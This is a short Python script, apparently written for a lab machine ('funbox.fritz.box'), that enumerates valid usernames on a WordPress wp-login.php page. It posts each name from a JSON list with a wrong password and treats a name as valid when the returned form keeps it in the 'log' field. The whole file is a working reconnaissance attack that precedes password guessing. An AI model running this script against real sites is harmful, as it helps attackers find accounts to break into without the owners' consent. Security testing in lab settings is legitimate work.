import requests
from bs4 import BeautifulSoup
import json


def main():
    print("Terminal Interface for Username Enumeration")
    url = input("Enter the login URL (e.g., http://funbox.fritz.box/wp-login.php): ")

    # Load usernames from the JSON file
    with open('usernames.json', 'r') as file:
        data = json.load(file)
        usernames = data["usernames"]

    available_usernames = []  # List to store available usernames
    print("\nTesting usernames...")
    for username in usernames:
        if test_username(url, username):
            available_usernames.append(username)

    # Print all available usernames at once at the end of the script
    if available_usernames:
        print("Available usernames:")
        print(", ".join(available_usernames))
    else:
        print("No available usernames found.")


def test_username(url, username):
    payload = {
        'log': username,  # This assumes the form field for username is named 'log'
        'pwd': 'incorrect_password'  # An incorrect password
    }

    try:
        session = requests.Session()
        response = session.post(url, data=payload)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Check if the username field still contains the username after the failed login attempt
        username_field = soup.find('input', {'name': 'log'})
        if username_field and username_field.get('value') == username:
            return True
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

    return False


if __name__ == "__main__":
    main()
